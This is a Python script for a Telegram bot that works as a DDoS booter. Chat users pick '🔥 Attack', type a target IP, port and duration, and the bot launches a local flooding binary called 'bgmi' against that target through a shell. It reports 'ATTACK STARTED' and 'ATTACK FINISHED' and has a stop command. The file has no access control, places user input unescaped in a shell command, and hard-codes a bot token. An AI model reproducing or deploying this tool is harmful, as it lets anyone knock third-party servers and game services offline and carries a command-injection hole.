
import telebot
import subprocess
import threading

bot_token = '6903741077:AAH7ZytSCJJz1WQz9XK76NWroFnpsbvAuC0'  # Replace with your bot token
bot = telebot.TeleBot(bot_token)

def run_attack(target, port, attack_time, message):
    try:
        full_command = f"./bgmi {target} {port} {attack_time} 100"  # Adjust command as needed
        subprocess.run(full_command, shell=True)
        bot.send_message(message.chat.id, "🚀⚡ ATTACK FINISHED⚡🚀")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ An error occurred: {str(e)}")

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 Attack"),
        telebot.types.KeyboardButton("🛑 Stop")
    )
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🔥 Attack":
        bot.send_message(message.chat.id, "Enter the target IP and port in the format: <IP> <port> <time>")
        bot.register_next_step_handler(message, process_attack)
    elif message.text == "🛑 Stop":
        subprocess.run("pkill -f bgmi", shell=True)  # Adjust as needed
        bot.reply_to(message, "🛑 Attack stopped.")

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        response = f"⚡ ATTACK STARTED ⚡\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds"
        bot.reply_to(message, response)

        # Start attack in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, message))
        attack_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

# Start polling
bot.polling()
